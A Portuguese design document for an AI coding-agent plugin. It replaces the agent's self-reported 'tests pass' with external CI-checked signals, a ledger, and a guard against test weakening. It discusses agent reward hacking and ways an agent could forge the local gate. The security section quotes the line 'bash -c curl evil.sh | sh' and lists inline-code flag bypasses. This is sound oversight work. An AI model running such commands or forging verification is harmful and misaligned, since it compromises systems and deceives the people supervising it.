# Design — Pipeline de sinal verificável: converter o estágio Test do PREVC de afirmação para observação

**Data:** 2026-07-09
**Status:** Design aprovado — pronto para plano de implementação
**Escala:** LARGE · **Autonomia:** supervised
**Origem:** Pedido do operador — "pipeline completa Plan | Code | Review | Test | Deploy; os testes sempre são unitários". A investigação reenquadrou o problema (ver §1).

---

## 1. Motivação

### 1.1 O reenquadramento

**PREVC já é Plan | Code | Review | Test | Deploy.** P=Plan, E=Code, R=Review, V=Test, C=Deploy. Não faltam estágios. Falta **maquinaria**: cada estágio hoje é uma instrução em Markdown dirigida ao agente; nenhum é um programa que devolve exit code.

É a distinção que a **ADR-012** deste repo já nomeou: **D7a** (controle auto-contornável) vs **D7b** (controle mecânico). Os cinco estágios do PREVC existem em D7a. Nenhum existe em D7b.

### 1.2 A premissa original não se sustenta

A queixa era "os testes sempre são unitários". A evidência diz outra coisa:

| Fato medido | Valor |
|---|---|
| Arquivos de teste (excl. fixtures) | **305** (243 `.mjs` + 62 `.sh`) |
| Usam `node:test` com asserts reais | **232** |
| Testes de integração | `tests/integration/` — 23 arquivos |
| Testes E2E | `tests/e2e/` + harness git isolado em tmpdir |
| Skills já exigem integração/E2E | `prevc-execution` §"Task touches…", `prevc-validation` §"E2E is mandatory when…" |

As skills **já** pregam a tabela certa ("CLI tools, shell scripts → Unit + E2E (real execution)"). Os testes de integração e E2E **já** existem.

### 1.3 O problema real

1. **Nada executa a suíte automaticamente.** Os 4 workflows de CI são `release.yml`, `tag-release.yml`, `version-guard.yml`, `stack-drift.yml`. Nenhum roda testes. Não há gate de teste em PR.
2. **Não existe comando canônico de suíte.** Sem `package.json` com script `test` (o da raiz é `"private": true`, manifesto de extensão do omp), sem Makefile. `node --test tests/lib/` **falha** (`Cannot find module`); `node --test "tests/lib/**/*.mjs"` funciona (157 testes, ~1,6 s). A invocação é folclore.
3. **O sensor determinístico existe e está morto.** O harness expõe `tests-passing`, `typecheck-clean`, `i18n-coverage`. `sensorRuns: []` — nunca rodou. Um workflow anterior registrou o motivo: *"sensor tests-passing incompatível: espera npm test/jest; repo usa node --test"*.
4. **Consequência:** quando a fase V afirma "testes passam", isso é **asserção do agente, não observação de sinal externo**.

O item 4 é o defeito. A literatura de agentes chama isso de *reward hacking*, e o antídoto é consenso: **sinal de verificação binário e externo, com gerador ≠ verificador** ("o modelo que escreveu o código é bom demais corrigindo a própria lição de casa").

### 1.4 Sobre "loop engineering"

Pesquisado e validado. **É jargão de blogosfera de jun/2026** (Steinberger → Swyx *"Loopcraft"* → Osmani), sem fonte primária. A substância técnica é o padrão **evaluator-optimizer** (Anthropic, *Building Effective Agents*, 2024) e **Reflexion** (Shinn et al., 2023), renomeados.

A evidência empírica é **mista, não triunfal**:
- SWE-Gym (ICML 2025): verificador + best-of-n dá **+12,3 pp** (SWE-bench Lite), **+13,6 pp** (Verified).
- Lin et al. (2026), *"To Run or Not to Run"*: em agentes comerciais com modelos SOTA, o gap entre proibir e liberar execução é de **1,25 pp, estatisticamente não-significativo**.

**Conclusão adotada:** não "adotamos loop engineering" como conceito. Adotamos os quatro invariantes que *são* consenso — sinal binário externo, gerador ≠ verificador, critério de parada explícito, orçamento de tentativas — e o quinto que a literatura de *held-out tests* recomenda: o agente não pode editar o que o julga.

---

## 2. Objetivos / Não-objetivos

**Objetivos:**
- Definir um **contrato de sinal** (`verify:` no `.devflow.yaml`) que qualquer projeto — Node, Python, Odoo — possa declarar.
- Dar ao repo um **comando canônico de suíte** e um **CI que o executa** como check obrigatório de PR.
- Fazer a fase V **ler um ledger** produzido por código, em vez de afirmar.
- Impedir mecanicamente o enfraquecimento de testes existentes.
- Validar tudo isso **no repo devflow primeiro** — ele é o primeiro cliente do plugin devflow.

**Não-objetivos (YAGNI / fora de escopo — cada um com plano próprio ou barrado por política):**
- **AO / execução paralela.** Tem design (`2026-06-19-ao-bridge-parallel-execution-design.md`) e 3 planos. Plano 1 (config) já mergeado (PR #53). Depende deste trabalho para ter sinal por worker.
- **Deploy verificado (smoke pós-release, rollback).** Próximo plano, agora com sinal para se apoiar.
- **Evals de skill-triggering / golden transcripts.**
- **`bats-core`, `vitest`, `promptfoo`, `Stryker`.** Barrados pela **política no-deps** (`observability.yaml`: as deps de OTel são *"a única exceção à política no-deps do DevFlow"*).
- **Sinal `large` (rede).** Bucket vazio: **nenhum** dos 305 arquivos toca a rede. Os 13 que casam `https://` usam URL como dado; `test-permissions-evaluator.mjs:177` tem `curl` **dentro de uma string sendo negada**; `test-update-default-standards.sh` aponta para path inexistente de propósito. Construir `large` hoje é generalidade especulativa.
- **Reclassificar os 305 arquivos em test sizes do Google.**
- **npm trusted publishing / OIDC / dist-tags canary.** Não se aplica: o plugin é distribuído por **marketplace git**, não npm (`package.json` é `"private": true`).

---

## 3. Decisões

| # | Decisão | Alternativa rejeitada | Por quê |
|---|---|---|---|
| **D1** | A maquinaria mora **no plugin**, validada no repo devflow como primeira cobaia | Só no repo (dogfooding) | Se mora só no repo, nenhum projeto-cliente ganha nada. Se mora só no plugin sem cobaia, pregamos o que não praticamos. |
| **D2** | O sinal é **declarado** em `.devflow.yaml`, lido pelo parser único (ADR-011) | Detecção heurística | Heurística é exatamente a suposição que matou `tests-passing`. Meu próprio grep classificou errado 12 de 13 arquivos ao tentar detectar rede. |
| **D3** | Comandos são **array argv**, executados com `execFile`, `argv[0]` em allowlist, flags de código inline (`-c`, `-e`) proibidas em `argv[1]` | String de comando | Ver §8. Impede injeção por concatenação e o erro honesto; não impede (nem pode) execução de código do próprio repo. |
| **D4** | Escopo v1 = **contrato + runner + CI + gate de V + guard** | Incluir Deploy e AO | Sem sinal, um loop é o agente conversando consigo mesmo, e a execução paralela do AO seriam N agentes conversando consigo mesmos. |
| **D5** | Sinais nomeados por **escopo** (`unit`/`integration`/`e2e`/`lint`); chave **ortogonal** `onTaskComplete` diz o que o hook roda | Test sizes do Google; ou só `fast`/`full` | `unit/integration/e2e` é o vocabulário que as skills e os planos **já** usam — zero tradução. *O que o gate exige* e *o que o hook roda* são conceitos distintos e merecem duas chaves. |
| **D6** | `lint` é **um sinal composto** | Um sinal por gate | Gate determinístico **não é opcional por task** — nenhum plano deveria poder dispensar o `adr-audit`. Não há nada a granularizar. E gate novo não vira breaking change de contrato. |
| **D7** | Anti-reward-hacking = **guard de enfraquecimento vs. merge-base**, override só por trailer `Weakens-Tests:` | Bloquear co-alteração teste+implementação | A regra de co-alteração bloquearia **todo commit TDD legítimo** — em RED→GREEN o teste e a implementação nascem juntos. A ameaça real é enfraquecimento, não co-alteração. |
| **D8** | **Hook grava o ledger; CI é o árbitro.** O agente só lê | Só CI; ou só ledger local | Ledger dá loop local de 1,6 s; CI dá arbitragem independente. O ledger é *gitignored* (`.gitignore:17`), logo o CI não pode compará-lo — e não precisa: se o CI re-roda e bloqueia no vermelho, ledger adulterado não compra nada. |
| **D9** | Sem `verify:` → V **avisa e fecha** (warn-only). Com `verify:` → **fail-closed** | Fail-closed desde o v1 | Fail-closed quebraria todo projeto-cliente existente no dia do update, inclusive os da NXZ em produção. Precedente: ADR-007 v1.0 entrou warn-only. |

---

## 4. Arquitetura

Três peças, uma responsabilidade cada. A separação **é** o design: o agente lê o ledger, ele não o escreve.

| Peça | Responsabilidade | Onde vive | Quem executa |
|---|---|---|---|
| **Contrato** | declara *quais* sinais existem e como produzi-los | `.context/.devflow.yaml` → `verify:` | ninguém (é dado) |
| **Executor** | roda um sinal, devolve exit code, faz append no ledger | `scripts/lib/verify-run.mjs` | `hooks/post-tool-use` e o CI |
| **Gate** | lê o ledger, decide se V fecha | `skills/prevc-validation` | o agente (**só lê**) |

```
E: agente edita código, marca task completa
        │
        ▼
hooks/post-tool-use  (CÓDIGO — fora da narrativa do agente)
   ├─ roda verify.onTaskComplete via verify-run.mjs
   ├─ append → .context/runtime/verify-ledger.jsonl
   └─ additionalContext: "❌ unit: 3 failing — tests/lib/foo.test.mjs:42"
        │                                        └── o RED volta ao agente = o loop
        ▼
V: prevc-validation LÊ o ledger (não roda nada)
   para cada requiredSignal do plano → exige exit 0 com treeDigest atual
        │
        ▼
CI (árbitro independente): re-roda os MESMOS sinais, pelo MESMO executor,
   lendo o MESMO .devflow.yaml → check obrigatório no PR
```

---

## 5. O contrato

```yaml
# .context/.devflow.yaml
verify:
  unit:        ["node", "--test", "tests/lib/**/*.mjs"]
  integration: ["bash", "tests/run-integration.sh"]
  e2e:         ["bash", "tests/run-e2e.sh"]
  lint:        ["bash", "tests/run-lint.sh"]

  # eixo ortogonal: o subconjunto que o hook roda no loop rápido
  onTaskComplete: [unit]        # ~1,6 s
```

**Regras do contrato:**
- Cada valor é **array argv**. String → erro de validação (fail-closed).
- `argv[0]` ∈ allowlist: `node`, `npm`, `pnpm`, `python`, `python3`, `pytest`, `make`, `bash`, `sh`.
- `argv[1]` **não** pode ser `-c` nem `-e` (flags de código inline).
- Vocabulário de sinais fechado no v1: `unit`, `integration`, `e2e`, `lint`.
- `onTaskComplete` ⊆ chaves declaradas.
- Parsing pelo parser único de `.devflow.yaml` (ADR-011). Sem re-parse ad-hoc.

**`requiredSignals` no plano.** `prevc-planning` (Step 5.5) já valida ordenação test-first e anota tipos de teste em prosa. Passa a emitir um campo:

```yaml
requiredSignals: [unit, e2e]
```

**A derivação é humana, a verificação é mecânica.** Quem escreve o plano (a skill `prevc-planning`, no Step 5.5) decide os sinais consultando a tabela que ela já possui; a fase R revisa essa escolha. O que é mecânico é o *gate*: uma vez declarado `e2e`, a fase V exige `exit 0` observado para `e2e` — não há como fechar sem ele. Não tentamos inferir os sinais a partir dos paths tocados: seria a mesma heurística frágil rejeitada em **D2**.

O efeito é o pedido original: *"só unitário"* deixa de ser possível **por omissão** — um plano que declara `e2e` e não o produz trava. Continua possível por **decisão explícita e revisável** (o autor do plano omitir `e2e`, e o revisor da fase R deixar passar), que é o lugar certo para essa responsabilidade morar.

---

## 6. O executor — `scripts/lib/verify-run.mjs`

Uma função. Nunca decide nada.

```
runSignal(name, { root }) →
  ├─ lê contrato (parser único ADR-011)
  ├─ valida: array? argv[0] ∈ allowlist? argv[1] ∉ {-c,-e}?   → senão throw
  ├─ execFile(argv[0], argv.slice(1), { cwd: root })          → sem sh -c
  └─ { signal, exit, durationMs, treeDigest, at }
```

**`treeDigest`** resolve um bug sutil: um `exit 0` gravado **antes** de o agente editar mais código é prova **vencida**. É o hash de `git rev-parse HEAD` + `git status --porcelain`, então qualquer mudança na árvore o invalida. O gate exige um verde cujo digest bate com o da árvore **agora**.

Conservador de propósito: editar só um `.md` invalida o verde de `unit`. Prefere-se re-rodar 1,6 s a aceitar prova velha.

---

## 7. O ledger e o loop

**`.context/runtime/verify-ledger.jsonl`** — append-only, uma linha JSON por execução:

```json
{"signal":"unit","exit":1,"durationMs":1612,"treeDigest":"a3f…","at":"2026-07-09T22:41:03Z","phase":"E"}
```

Fica em diretório *gitignored* (`.gitignore:17`). Limitação e virtude: nunca vai ao PR, portanto o CI não pode confiar nele — e não precisa (D8).

**O hook fecha o loop.** `hooks/post-tool-use` **já** tem o ramo `TaskUpdate` + `completed` (linha 243) e **já** sabe emitir `additionalContext`. É o encaixe exato — e dispara por *task completa*, não por edição, o que torna o custo suportável.

**Critério de parada e orçamento** (os invariantes que a literatura exige, e que o ledger dá de graça): o hook lê a cauda do ledger; **3 REDs consecutivos do mesmo sinal sem um GREEN** → emite escalação ao humano em vez de deixar o agente girar. Custa uma leitura de arquivo.

---

## 8. Segurança — o que garante e o que não garante

Esta seção existe porque a formulação ingênua **overpromete**, e uma ADR que promete anti-RCE sem cumprir é pior que nenhuma.

`["bash", "-c", "curl evil.sh | sh"]` é um argv array válido e é shell irrestrito. Mesmo `["node", "tests/run.mjs"]` executa o que estiver em `run.mjs`. **Rodar os testes de um repositório *é*, por definição, executar código daquele repositório.** Nenhuma allowlist muda isso.

**O que o argv array garante:**
- **impede injeção por concatenação** — nenhum valor de config é interpolado em string de comando;
- **torna o comando auditável** — declarado, versionado, cabe numa linha de review;
- **impede o erro honesto** — o `&&` que alguém escreveria sem pensar simplesmente não funciona;
- **fecha o caso preguiçoso** — `-c`/`-e` proibidos em `argv[1]`.

**O que ele não garante:** proteção contra `.devflow.yaml` hostil.

**Para isso o eixo é *quando*, não *o quê*.** O perigo real é drive-by: clonar repo desconhecido, abrir o Claude Code, e o hook executar.

- Sinais **nunca** rodam em `session-start`. Só após o operador invocar um comando DevFlow naquele repo.
- `/devflow init` e `/devflow update` **exibem os comandos declarados** antes de qualquer execução.

Alinha com ADR-004 (deny-first), ADR-007 (`.js` bundled-only) e ADR-009 (fail-closed) sem fingir uma garantia que não temos.

---

## 9. O gate da fase V

`prevc-validation` ganha um passo que **só lê**:

```
para cada s em plano.requiredSignals:
  e = última entrada do ledger com signal == s
  ├ sem entrada                      → BLOCK "V afirmou sem observar"
  ├ e.treeDigest ≠ treeDigest atual  → BLOCK "prova vencida; re-rode o sinal"
  ├ e.exit ≠ 0                       → BLOCK "sinal vermelho: <s>"
  └ ok                               → PASS
```

Sem `verify:` no projeto (D9): **warn-only** — V avisa *"nenhum sinal declarado; esta validação é auto-reportada"* e fecha. Vira enforcement numa major seguinte.

---

## 10. O guard anti-enfraquecimento

`scripts/lib/test-weakening-guard.mjs`, executado **dentro do sinal `lint`**.

```
baseline = git merge-base HEAD origin/main

para cada arquivo de teste presente na baseline:
  ├ sumiu                       → BLOCK
  ├ ganhou .skip / todo:true    → BLOCK
  └ nº de asserts diminuiu      → BLOCK

arquivos de teste NOVOS → ignorados (livre)

override: trailer de commit  →  Weakens-Tests: <justificativa>
```

Adicionar teste é sempre livre; enfraquecer nunca é silencioso. Contagem de asserts por regex sobre `node:assert` (`assert.` / `assert(`) e blocos `test(` / `it(`.

---

## 11. Estratégia de testes (TDD — RED→GREEN→REFACTOR, sem exceção)

| Alvo | unit | e2e |
|---|---|---|
| `verify-run.mjs` | argv como string → throw; `argv[0]` fora da allowlist → throw; `-c`/`-e` em `argv[1]` → throw; exit code propagado; `treeDigest` muda com a árvore | roda sinal real em repo tmpdir |
| ledger | append preserva ordem; leitura de cauda detecta 3 REDs consecutivos; entrada malformada não derruba o leitor | — |
| `hooks/post-tool-use` | — | fixture git em tmpdir (**`tests/e2e/_harness.mjs` já existe**); task completa → ledger ganha entrada; `session-start` **não** roda sinal |
| `test-weakening-guard.mjs` | teste deletado → BLOCK; `.skip` adicionado → BLOCK; assert removido → BLOCK; teste novo → PASS; trailer presente → PASS | — |
| gate de V | ledger vazio → BLOCK; digest vencido → BLOCK; exit≠0 → BLOCK; verde válido → PASS; sem `verify:` → WARN+PASS | — |
| runners (`run-*.sh`) | — | cada um retorna exit≠0 quando um teste-membro falha |

Os ~62 testes `.sh` já retornam `exit 1` corretamente; os runners são wrappers de ~30 linhas, sem dependência nova.

---

## 12. Riscos assumidos

1. **Custo do hook.** `unit` a cada task completa adiciona ~1,6 s. Aceitável. Se alguém puser `e2e` em `onTaskComplete`, deixa de ser — documentar.
2. **`treeDigest` conservador.** Editar um `.md` invalida um verde de `unit`. Falso positivo custa 1,6 s; prova vencida custa um bug em produção.
3. **Contagem de asserts por regex é aproximada.** Um refactor legítimo que funde dois asserts dispara falso positivo. O trailer existe para isso: falso positivo custa uma linha de commit; falso negativo custa um teste morto.
4. **Ledger local e gitignored.** Não há prova criptográfica de que o hook rodou. Um agente poderia `rm` o ledger — mas aí não tem verde nenhum e V bloqueia. O ataque não paga.
5. **Warn-only (D9) prolonga o teatro.** Durante a transição, projetos sem `verify:` continuam auto-reportando. É o preço de não quebrar produção.
6. **Ganho marginal incerto.** Lin et al. (2026) sugere que, em modelos SOTA, o loop de execução pode render pouco. O valor primário aqui **não é acelerar o agente** — é **tornar o gate honesto**. Esse valor não depende do modelo.

---

## 13. Componentes tocados

| Arquivo | Ação |
|---|---|
| `scripts/lib/verify-run.mjs` | novo |
| `scripts/lib/verify-ledger.mjs` | novo (append + leitura de cauda) |
| `scripts/lib/test-weakening-guard.mjs` | novo |
| `tests/run-integration.sh`, `tests/run-e2e.sh`, `tests/run-lint.sh` | novos |
| `.github/workflows/test.yml` | novo — matriz sobre os 4 sinais |
| `hooks/post-tool-use` | estende o ramo `TaskUpdate`+`completed` (linha 243) |
| `skills/prevc-validation/SKILL.md` | novo passo: lê o ledger |
| `skills/prevc-planning/SKILL.md` | Step 5.5 emite `requiredSignals` |
| `skills/config/SKILL.md` | entrevista oferece o bloco `verify:` |
| `.context/.devflow.yaml` | novo bloco `verify:` (dogfooding) |
| `.context/docs/testing-strategy.md` | **corrigir** — afirma que não há framework de testes |

---

## 14. Referências

- ADR-004 (permissions deny-first), ADR-007 (anti-RCE, warn-only→enforce), ADR-009 (fail-closed), ADR-011 (parser único `.devflow.yaml`), ADR-012 (D7a vs D7b; proveniência).
- Anthropic — *Building Effective Agents* (evaluator-optimizer): https://www.anthropic.com/engineering/building-effective-agents
- Shinn et al. — *Reflexion* (2023): https://arxiv.org/abs/2303.11366
- SWE-Gym (ICML 2025): https://arxiv.org/abs/2412.21139
- Lin et al. — *To Run or Not to Run* (2026): https://arxiv.org/abs/2606.26978
- Fowler — *On the Diverse and Fantastical Shapes of Testing* (2021): https://martinfowler.com/articles/2021-test-shapes.html
- *Software Engineering at Google*, cap. 11 (Test Sizes): https://abseil.io/resources/swe-book/html/ch11.html
- Design irmão (fora de escopo aqui): `docs/superpowers/specs/2026-06-19-ao-bridge-parallel-execution-design.md`

---

## Errata (2026-07-14, durante planejamento + implementação)

Premissas de fato corrigidas na medição e na revisão (a decisão de design permanece; só os números/mecanismos abaixo mudaram):

- **§12.1 / §5:** `onTaskComplete: [unit]` custa **~24 s**, não 1,6 s — `unit` cobre toda a suíte `.mjs` (fora integration/e2e), não só `tests/lib` (que é ~8% da suíte). Cobrir 8% reconstruiria o modo de falha do `tests-passing`.
- **§7:** o hook `post-tool-use` está registrado com `async: true`; o Claude Code descarta stdout de hooks async, então o `additionalContext` (o loop de RED) **não chega ao agente**. O loop rápido no hook ficou **fora do escopo v1** (follow-up: `asyncRewake`+`exit 2`+stderr). O executor é rodado explicitamente (CLI) na fase E/V; o gate honesto (executor + ledger + CI + gate de V) **não depende do hook**.
- **§4/D1:** o hook e as skills rodam do cache do plugin (pin project-scoped 1.23.1), não da árvore. Dogfooding do hook exige `--plugin-dir` ou release; o executor e o CI dogfoodam do checkout (validado: `verify-run.mjs unit/lint` verde no repo, ledger gravado).
- **§9 (revisão de segurança):** o gate local é auxiliar e forjável (ledger gitignored, `treeDigest` sem segredo). A independência gerador ≠ verificador é do **CI required check**, não do gate local — por isso o `test.yml` como required check é o que dá dente ao design.
- **§8 (revisão de segurança):** a allowlist não fechava código inline além de `-c`/`-e` curtos (`node --eval`/`-p`/`-pe`, `bash -lc`, `python -c` passavam). Fechado com `assertNoInlineCode` varrendo todo o argv, replicado no guard do contrato.

- **Alcance em projetos-cliente:** o plugin é distribuído para outros projetos. No v1, contrato + executor + ledger + gate de V + guard **do contrato** são agnósticos de linguagem e rodam em qualquer cliente via `${CLAUDE_PLUGIN_ROOT}`. Duas peças têm alcance limitado: o guard **anti-enfraquecimento de testes** só cobre JS/`.mjs` (inerte em Python/Odoo), e o **CI árbitro** é dogfoodado no repo devflow (em clientes, o CI é responsabilidade do time — sem ele o gate é auto-atestação D7a). Generalizar o guard e scaffoldar CI ao cliente são follow-ups. Coerente com "dar **ao repo** um CI" e "validar **no repo devflow primeiro**" (§2).

Decisão arquitetural formalizada na **ADR-013** (`.context/engineering/adrs/013-verifiable-signal-pipeline-v1.0.0.md`), que refina a ADR-011.
